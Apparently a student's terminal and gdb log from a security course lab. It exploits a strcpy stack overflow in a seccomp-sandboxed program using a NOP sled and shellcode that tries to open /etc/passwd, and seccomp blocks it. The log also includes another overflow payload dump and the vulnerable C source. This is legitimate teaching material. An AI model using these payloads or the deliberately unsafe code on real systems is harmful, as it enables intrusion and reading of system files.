Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./sec_prog...(no debugging symbols found)...done.
(gdb) disas read_input 
Dump of assembler code for function read_input:
   0x0000000000400958 <+0>:	push   %rbp
   0x0000000000400959 <+1>:	mov    %rsp,%rbp
   0x000000000040095c <+4>:	sub    $0x200,%rsp
   0x0000000000400963 <+11>:	mov    $0x400b2b,%edi
   0x0000000000400968 <+16>:	callq  0x400770 <puts@plt>
   0x000000000040096d <+21>:	mov    0x2006fc(%rip),%rdx        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x0000000000400974 <+28>:	lea    -0x200(%rbp),%rax
   0x000000000040097b <+35>:	mov    %rdx,%rcx
   0x000000000040097e <+38>:	mov    $0x200,%edx
   0x0000000000400983 <+43>:	mov    $0x1,%esi
   0x0000000000400988 <+48>:	mov    %rax,%rdi
   0x000000000040098b <+51>:	callq  0x400780 <fread@plt>
   0x0000000000400990 <+56>:	lea    -0x200(%rbp),%rax
   0x0000000000400997 <+63>:	mov    %rax,%rdi
   0x000000000040099a <+66>:	callq  0x4008ee <complex_verify>
   0x000000000040099f <+71>:	test   %eax,%eax
   0x00000000004009a1 <+73>:	js     0x4009af <read_input+87>
   0x00000000004009a3 <+75>:	mov    $0x400b46,%edi
   0x00000000004009a8 <+80>:	callq  0x400770 <puts@plt>
   0x00000000004009ad <+85>:	jmp    0x4009b9 <read_input+97>
   0x00000000004009af <+87>:	mov    $0x0,%eax
   0x00000000004009b4 <+92>:	callq  0x4008d6 <party>
   0x00000000004009b9 <+97>:	leaveq 
   0x00000000004009ba <+98>:	retq   
End of assembler dump.
(gdb) b complex_verify 
Breakpoint 1 at 0x4008f2
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/sec_prog < payload
Enter verification string?

Breakpoint 1, 0x00000000004008f2 in complex_verify ()
(gdb) disas
Dump of assembler code for function complex_verify:
   0x00000000004008ee <+0>:	push   %rbp
   0x00000000004008ef <+1>:	mov    %rsp,%rbp
=> 0x00000000004008f2 <+4>:	sub    $0x60,%rsp
   0x00000000004008f6 <+8>:	mov    %rdi,-0x58(%rbp)
   0x00000000004008fa <+12>:	mov    -0x58(%rbp),%rax
   0x00000000004008fe <+16>:	mov    %rax,%rsi
   0x0000000000400901 <+19>:	mov    $0x400b1c,%edi
   0x0000000000400906 <+24>:	mov    $0x0,%eax
   0x000000000040090b <+29>:	callq  0x4007a0 <printf@plt>
   0x0000000000400910 <+34>:	mov    -0x58(%rbp),%rdx
   0x0000000000400914 <+38>:	lea    -0x50(%rbp),%rax
   0x0000000000400918 <+42>:	mov    %rdx,%rsi
   0x000000000040091b <+45>:	mov    %rax,%rdi
   0x000000000040091e <+48>:	callq  0x400750 <strcpy@plt>
   0x0000000000400923 <+53>:	movl   $0x0,-0x4(%rbp)
   0x000000000040092a <+60>:	jmp    0x400948 <complex_verify+90>
   0x000000000040092c <+62>:	mov    -0x4(%rbp),%eax
   0x000000000040092f <+65>:	cltq   
   0x0000000000400931 <+67>:	movzbl -0x50(%rbp,%rax,1),%eax
   0x0000000000400936 <+72>:	add    $0x1,%eax
   0x0000000000400939 <+75>:	mov    %eax,%edx
   0x000000000040093b <+77>:	mov    -0x4(%rbp),%eax
   0x000000000040093e <+80>:	cltq   
   0x0000000000400940 <+82>:	mov    %dl,-0x50(%rbp,%rax,1)
   0x0000000000400944 <+86>:	addl   $0x1,-0x4(%rbp)
   0x0000000000400948 <+90>:	mov    -0x4(%rbp),%eax
   0x000000000040094b <+93>:	cmp    $0x3e,%eax
   0x000000000040094e <+96>:	jbe    0x40092c <complex_verify+62>
   0x0000000000400950 <+98>:	mov    -0x4(%rbp),%eax
   0x0000000000400953 <+101>:	sub    $0x3e,%eax
   0x0000000000400956 <+104>:	leaveq 
   0x0000000000400957 <+105>:	retq   
End of assembler dump.
(gdb) b *0x0000000000400910
Breakpoint 2 at 0x400910
(gdb) c
Continuing.
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????

Breakpoint 2, 0x0000000000400910 in complex_verify ()
(gdb) b *0x0000000000400923
Breakpoint 3 at 0x400923
(gdb) c
Continuing.

Breakpoint 3, 0x0000000000400923 in complex_verify ()
(gdb) bt
#0  0x0000000000400923 in complex_verify ()
#1  0x00007fffffffe1aa in ?? ()
#2  0x4141414141414141 in ?? ()
#3  0x4141414141414141 in ?? ()
#4  0x4141414141414141 in ?? ()
#5  0x4141414141414141 in ?? ()
#6  0x4141414141414141 in ?? ()
#7  0x4141414141414141 in ?? ()
#8  0x4141414141414141 in ?? ()
#9  0x4141414141414141 in ?? ()
#10 0x4141414141414141 in ?? ()
#11 0x4141414141414141 in ?? ()
#12 0x4141414141414141 in ?? ()
#13 0x00007fffffffe1aa in ?? ()
#14 0x9090909090909090 in ?? ()
#15 0x9090909090909090 in ?? ()
#16 0x9090909090909090 in ?? ()
#17 0x9090909090909090 in ?? ()
#18 0x9090909090909090 in ?? ()
#19 0x9090909090909090 in ?? ()
#20 0x9090909090909090 in ?? ()
#21 0x9090909090909090 in ?? ()
#22 0x9090909090909090 in ?? ()
#23 0x9090909090909090 in ?? ()
#24 0x9090909090909090 in ?? ()
#25 0x9090909090909090 in ?? ()
#26 0x793d8d4890909090 in ?? ()
#27 0x1116ef8148011111 in ?? ()
#28 0x4802b0c031480111 in ?? ()
#29 0x48050fd23148f631 in ?? ()
#30 0x4805b0c03148c389 in ?? ()
#31 0x814801111191c6c7 in ?? ()
#32 0xdf894801111101ee in ?? ()
#33 0x050fe68948f42948 in ?? ()
#34 0xd429483024548b48 in ?? ()
#35 0x3148e68948df8948 in ?? ()
#36 0xff48c03148050fc0 in ?? ()
#37 0x48c7ff48ff3148c0 in ?? ()
#38 0x04c03148050fe689 in ?? ()
#39 0x652f050fff31483c in ?? ()
#40 0x77737361702f6374 in ?? ()
#41 0x0000000000000064 in ?? ()
#42 0x00007ffff7bbb250 in ?? () from /lib/x86_64-linux-gnu/libseccomp.so.2
#43 0x00007ffff78cfc5a in prctl () at ../sysdeps/unix/syscall-template.S:84
#44 0x0000000000000000 in ?? ()
(gdb) b *0x0000000000400957
Breakpoint 4 at 0x400957
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/3i $rip
>end
(gdb) c
Continuing.
=> 0x400957 <complex_verify+105>:	retq   
   0x400958 <read_input>:	push   %rbp
   0x400959 <read_input+1>:	mov    %rsp,%rbp

Breakpoint 4, 0x0000000000400957 in complex_verify ()
(gdb) si
=> 0x7fffffffe1aa:	nop
   0x7fffffffe1ab:	nop
   0x7fffffffe1ac:	nop
0x00007fffffffe1aa in ?? ()
(gdb) 
=> 0x7fffffffe1ab:	nop
   0x7fffffffe1ac:	nop
   0x7fffffffe1ad:	nop
0x00007fffffffe1ab in ?? ()
(gdb) 
=> 0x7fffffffe1ac:	nop
   0x7fffffffe1ad:	nop
   0x7fffffffe1ae:	nop
0x00007fffffffe1ac in ?? ()
(gdb) 
=> 0x7fffffffe1ad:	nop
   0x7fffffffe1ae:	nop
   0x7fffffffe1af:	nop
0x00007fffffffe1ad in ?? ()
(gdb) 
=> 0x7fffffffe1ae:	nop
   0x7fffffffe1af:	nop
   0x7fffffffe1b0:	nop
0x00007fffffffe1ae in ?? ()
(gdb) 
=> 0x7fffffffe1af:	nop
   0x7fffffffe1b0:	nop
   0x7fffffffe1b1:	nop
0x00007fffffffe1af in ?? ()
(gdb) 
=> 0x7fffffffe1b0:	nop
   0x7fffffffe1b1:	nop
   0x7fffffffe1b2:	nop
0x00007fffffffe1b0 in ?? ()
(gdb) 
=> 0x7fffffffe1b1:	nop
   0x7fffffffe1b2:	nop
   0x7fffffffe1b3:	nop
0x00007fffffffe1b1 in ?? ()
(gdb) 
=> 0x7fffffffe1b2:	nop
   0x7fffffffe1b3:	nop
   0x7fffffffe1b4:	nop
0x00007fffffffe1b2 in ?? ()
(gdb) 
=> 0x7fffffffe1b3:	nop
   0x7fffffffe1b4:	nop
   0x7fffffffe1b5:	nop
0x00007fffffffe1b3 in ?? ()
(gdb) 
=> 0x7fffffffe1b4:	nop
   0x7fffffffe1b5:	nop
   0x7fffffffe1b6:	nop
0x00007fffffffe1b4 in ?? ()
(gdb) 
=> 0x7fffffffe1b5:	nop
   0x7fffffffe1b6:	nop
   0x7fffffffe1b7:	nop
0x00007fffffffe1b5 in ?? ()
(gdb) 
=> 0x7fffffffe1b6:	nop
   0x7fffffffe1b7:	nop
   0x7fffffffe1b8:	nop
0x00007fffffffe1b6 in ?? ()
(gdb) 
=> 0x7fffffffe1b7:	nop
   0x7fffffffe1b8:	nop
   0x7fffffffe1b9:	nop
0x00007fffffffe1b7 in ?? ()
(gdb) 
=> 0x7fffffffe1b8:	nop
   0x7fffffffe1b9:	nop
   0x7fffffffe1ba:	nop
0x00007fffffffe1b8 in ?? ()
(gdb) 
=> 0x7fffffffe1b9:	nop
   0x7fffffffe1ba:	nop
   0x7fffffffe1bb:	nop
0x00007fffffffe1b9 in ?? ()
(gdb) 
=> 0x7fffffffe1ba:	nop
   0x7fffffffe1bb:	nop
   0x7fffffffe1bc:	nop
0x00007fffffffe1ba in ?? ()
(gdb) 
=> 0x7fffffffe1bb:	nop
   0x7fffffffe1bc:	nop
   0x7fffffffe1bd:	nop
0x00007fffffffe1bb in ?? ()
(gdb) 
=> 0x7fffffffe1bc:	nop
   0x7fffffffe1bd:	nop
   0x7fffffffe1be:	nop
0x00007fffffffe1bc in ?? ()
(gdb) 
=> 0x7fffffffe1bd:	nop
   0x7fffffffe1be:	nop
   0x7fffffffe1bf:	nop
0x00007fffffffe1bd in ?? ()
(gdb) 
=> 0x7fffffffe1be:	nop
   0x7fffffffe1bf:	nop
   0x7fffffffe1c0:	nop
0x00007fffffffe1be in ?? ()
(gdb) 
=> 0x7fffffffe1bf:	nop
   0x7fffffffe1c0:	nop
   0x7fffffffe1c1:	nop
0x00007fffffffe1bf in ?? ()
(gdb) 
=> 0x7fffffffe1c0:	nop
   0x7fffffffe1c1:	nop
   0x7fffffffe1c2:	nop
0x00007fffffffe1c0 in ?? ()
(gdb) 
=> 0x7fffffffe1c1:	nop
   0x7fffffffe1c2:	nop
   0x7fffffffe1c3:	nop
0x00007fffffffe1c1 in ?? ()
(gdb) 
=> 0x7fffffffe1c2:	nop
   0x7fffffffe1c3:	nop
   0x7fffffffe1c4:	lea    0x1111179(%rip),%rdi        # 0x80000110f344
0x00007fffffffe1c2 in ?? ()
(gdb) 
=> 0x7fffffffe1c3:	nop
   0x7fffffffe1c4:	lea    0x1111179(%rip),%rdi        # 0x80000110f344
   0x7fffffffe1cb:	sub    $0x1111116,%rdi
0x00007fffffffe1c3 in ?? ()
(gdb) 
=> 0x7fffffffe1c4:	lea    0x1111179(%rip),%rdi        # 0x80000110f344
   0x7fffffffe1cb:	sub    $0x1111116,%rdi
   0x7fffffffe1d2:	xor    %rax,%rax
0x00007fffffffe1c4 in ?? ()
(gdb) 
=> 0x7fffffffe1cb:	sub    $0x1111116,%rdi
   0x7fffffffe1d2:	xor    %rax,%rax
   0x7fffffffe1d5:	mov    $0x2,%al
0x00007fffffffe1cb in ?? ()
(gdb) 
=> 0x7fffffffe1d2:	xor    %rax,%rax
   0x7fffffffe1d5:	mov    $0x2,%al
   0x7fffffffe1d7:	xor    %rsi,%rsi
0x00007fffffffe1d2 in ?? ()
(gdb) 
=> 0x7fffffffe1d5:	mov    $0x2,%al
   0x7fffffffe1d7:	xor    %rsi,%rsi
   0x7fffffffe1da:	xor    %rdx,%rdx
0x00007fffffffe1d5 in ?? ()
(gdb) 
=> 0x7fffffffe1d7:	xor    %rsi,%rsi
   0x7fffffffe1da:	xor    %rdx,%rdx
   0x7fffffffe1dd:	syscall 
0x00007fffffffe1d7 in ?? ()
(gdb) 
=> 0x7fffffffe1da:	xor    %rdx,%rdx
   0x7fffffffe1dd:	syscall 
   0x7fffffffe1df:	mov    %rax,%rbx
0x00007fffffffe1da in ?? ()
(gdb) 
=> 0x7fffffffe1dd:	syscall 
   0x7fffffffe1df:	mov    %rax,%rbx
   0x7fffffffe1e2:	xor    %rax,%rax
0x00007fffffffe1dd in ?? ()
(gdb) 

Program terminated with signal SIGSYS, Bad system call.
The program no longer exists.
Error while running hook_stop:
No registers.
(gdb) quit
ryadav3@nemo:~/576/labs/lab9/vul$ setarch x86_64 -R ./sec_prog < payload
Enter verification string?
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????
Bad system call
ryadav3@nemo:~/576/labs/lab9/vul$ dmesg | tail -1
[5710342.579609] audit: type=1326 audit(1541088061.022:40): auid=12903 uid=12903 gid=30000 ses=9297 pid=20674 comm="sec_prog" exe="/home/ryadav3/576/labs/lab9/vul/sec_prog" sig=31 arch=c000003e syscall=2 compat=0 ip=0x7fffffffe1ff code=0x0
ryadav3@nemo:~/576/labs/lab9/vul$ dmesg | tail -3
[5710196.124603] audit: type=1326 audit(1541087914.560:38): auid=12903 uid=12903 gid=30000 ses=9297 pid=20626 comm="sec_prog" exe="/home/ryadav3/576/labs/lab9/vul/sec_prog" sig=31 arch=c000003e syscall=2 compat=0 ip=0x7fffffffe1ff code=0x0
[5710333.340333] audit: type=1326 audit(1541088051.782:39): auid=12903 uid=12903 gid=30000 ses=9297 pid=20634 comm="sec_prog" exe="/home/ryadav3/576/labs/lab9/vul/sec_prog" sig=31 arch=c000003e syscall=2 compat=0 ip=0x7fffffffe1df code=0x0
[5710342.579609] audit: type=1326 audit(1541088061.022:40): auid=12903 uid=12903 gid=30000 ses=9297 pid=20674 comm="sec_prog" exe="/home/ryadav3/576/labs/lab9/vul/sec_prog" sig=31 arch=c000003e syscall=2 compat=0 ip=0x7fffffffe1ff code=0x0
ryadav3@nemo:~/576/labs/lab9/vul$ dmesg | tail -1
[5710342.579609] audit: type=1326 audit(1541088061.022:40): auid=12903 uid=12903 gid=30000 ses=9297 pid=20674 comm="sec_prog" exe="/home/ryadav3/576/labs/lab9/vul/sec_prog" sig=31 arch=c000003e syscall=2 compat=0 ip=0x7fffffffe1ff code=0x0
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ dmesg | tail -1
[5710342.579609] audit: type=1326 audit(1541088061.022:40): auid=12903 uid=12903 gid=30000 ses=9297 pid=20674 comm="sec_prog" exe="/home/ryadav3/576/labs/lab9/vul/sec_prog" sig=31 arch=c000003e syscall=2 compat=0 ip=0x7fffffffe1ff code=0x0
ryadav3@nemo:~/576/labs/lab9/vul$ locate seccomp
/lib/x86_64-linux-gnu/libseccomp.so.2
/lib/x86_64-linux-gnu/libseccomp.so.2.3.1
/usr/include/linux/seccomp.h
/usr/lib/snapd/snap-seccomp
/usr/share/doc/libseccomp2
/usr/share/doc/libseccomp2/changelog.Debian.gz
/usr/share/doc/libseccomp2/copyright
/usr/share/doc/lxc-common/examples/seccomp-v1.conf
/usr/share/doc/lxc-common/examples/seccomp-v2-blacklist.conf
/usr/share/doc/lxc-common/examples/seccomp-v2.conf
/usr/share/man/man2/seccomp.2.gz
/usr/src/linux-headers-4.4.0-130/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-130/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-130/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-130/samples/seccomp
/usr/src/linux-headers-4.4.0-130/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-130/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-130/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-130-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-130-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-130-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/seccomp/filter.h
/usr/src/linux-headers-4.4.0-133/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-133/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-133/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-133/samples/seccomp
/usr/src/linux-headers-4.4.0-133/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-133/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-133/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-133-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-133-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-133-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/seccomp/filter.h
/usr/src/linux-headers-4.4.0-134/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-134/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-134/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-134/samples/seccomp
/usr/src/linux-headers-4.4.0-134/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-134/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-134/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-134-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-134-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-134-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/seccomp/filter.h
/usr/src/linux-headers-4.4.0-137/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-137/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-137/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-137/samples/seccomp
/usr/src/linux-headers-4.4.0-137/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-137/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-137/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-137-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-137-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-137-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/seccomp/filter.h
/usr/src/linux-headers-4.4.0-138/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-138/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-138/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-138/samples/seccomp
/usr/src/linux-headers-4.4.0-138/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-138/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-138/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-138-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-138-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-138-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/seccomp/filter.h
/var/lib/dpkg/info/libseccomp2:amd64.list
/var/lib/dpkg/info/libseccomp2:amd64.md5sums
/var/lib/dpkg/info/libseccomp2:amd64.shlibs
/var/lib/dpkg/info/libseccomp2:amd64.symbols
/var/lib/dpkg/info/libseccomp2:amd64.triggers
ryadav3@nemo:~/576/labs/lab9/vul$ ls -l /usr/src/linux-headers-4.4.0-130/arch/arm64/include/asm/seccomp.h
-rw-r--r-- 1 root root 714 Jan 10  2016 /usr/src/linux-headers-4.4.0-130/arch/arm64/include/asm/seccomp.h
ryadav3@nemo:~/576/labs/lab9/vul$ ls -l /usr/src/linux-headers-4.4.0-138/samples/seccomp
total 4
-rw-r--r-- 1 root root 1430 Jan 10  2016 Makefile
ryadav3@nemo:~/576/labs/lab9/vul$ less /usr/src/linux-headers-4.4.0-138/samples/seccomp/Makefile 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ man seccomp
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ cd ..
ryadav3@nemo:~/576/labs/lab9$ cd ..
ryadav3@nemo:~/576/labs$ cd lab9/vul/
ryadav3@nemo:~/576/labs/lab9/vul$ ls
Makefile  payload  payload.py  sec_prog  sec_prog10.c  sec_prog1.c  vuln_prog  vuln_prog1.c
ryadav3@nemo:~/576/labs/lab9/vul$ cd ../..
ryadav3@nemo:~/576/labs$ cd lab7/
ryadav3@nemo:~/576/labs/lab7$ ls
makefile  mal  unreachable  unreachable.c
ryadav3@nemo:~/576/labs/lab7$ vim unreachable.c 
ryadav3@nemo:~/576/labs/lab7$ xxd mal 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000070: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000080: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000090: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000100: 4141 4141 4141 4141 02e1 a2f7 ff7f 0000  AAAAAAAA........
00000110: b4e6 ffff ff7f 0000 9023 a5f7 ff7f 0000  .........#......
00000120: 0a                                       .
ryadav3@nemo:~/576/labs/lab7$ vim unreachable.c 
ryadav3@nemo:~/576/labs/lab7$ cat makefile 
FLAGS = -fno-stack-protector
FILES = unreachable.c


all:
	gcc $(FLAGS) $(FILES) -o unreachable 
clear:
	rm unreachable
ryadav3@nemo:~/576/labs/lab7$ cd ../lab6/
ryadav3@nemo:~/576/labs/lab6$ ls
E1  E2  E3_Unbelievable  E4_Grades  hw2.tar.gz
ryadav3@nemo:~/576/labs/lab6$ cd E3_Unbelievable/
ryadav3@nemo:~/576/labs/lab6/E3_Unbelievable$ ls
makefile  old_unreachable  unreachable  unreachable.c
ryadav3@nemo:~/576/labs/lab6/E3_Unbelievable$ cd ../../lab7/
ryadav3@nemo:~/576/labs/lab7$ ls
makefile  mal  unreachable  unreachable.c
ryadav3@nemo:~/576/labs/lab7$ vim unreachable.c 
ryadav3@nemo:~/576/labs/lab7$ vim ma
ryadav3@nemo:~/576/labs/lab7$ vim makefile 
ryadav3@nemo:~/576/labs/lab7$ vim mal 
ryadav3@nemo:~/576/labs/lab7$ cd ..
ryadav3@nemo:~/576/labs$ cd lab8/
ryadav3@nemo:~/576/labs/lab8$ ls
prof  test
ryadav3@nemo:~/576/labs/lab8$ cd test/
ryadav3@nemo:~/576/labs/lab8/test$ ls
exploit.py  exploit.rb  Makefile  out  payload  ppp  victim  victim.c
ryadav3@nemo:~/576/labs/lab8/test$ cd ../../lab9/vul/
ryadav3@nemo:~/576/labs/lab9/vul$ ls
Makefile  payload  payload.py  sec_prog  sec_prog10.c  sec_prog1.c  vuln_prog  vuln_prog1.c
ryadav3@nemo:~/576/labs/lab9/vul$ vim Makefile 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ vim vuln_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <seccomp.h>

static void party()
{       
        printf("Verification succeeded!\n");
        exit(EXIT_SUCCESS);
}

static int complex_verify(const char *buffer)
{
        char str[64];

        printf("Verifying: %s\n", buffer);
        strcpy(str, buffer);

        int i;
        for (i = 0; i < (sizeof(str) - 1); i++)
                str[i]++;
        return (i - 62);
}

static void read_input()
{
        char buffer[512];

        printf("Enter verification string?\n");
        if (fread(buffer, 1, 512, stdin) < 0) {
                perror("Error reading input");
                return;
        }

        if (complex_verify(buffer) >= 0)
                printf("Verification failed!\n");
        else
                party();
}

int main(int argc, char **argv)
{
        scmp_filter_ctx * ctx;
        ctx = seccomp_init(SCMP_ACT_KILL);

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        // puts inherently calls syscall 5 (fstat)
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);

        seccomp_load(ctx);

        read_input();

        return EXIT_SUCCESS;
}
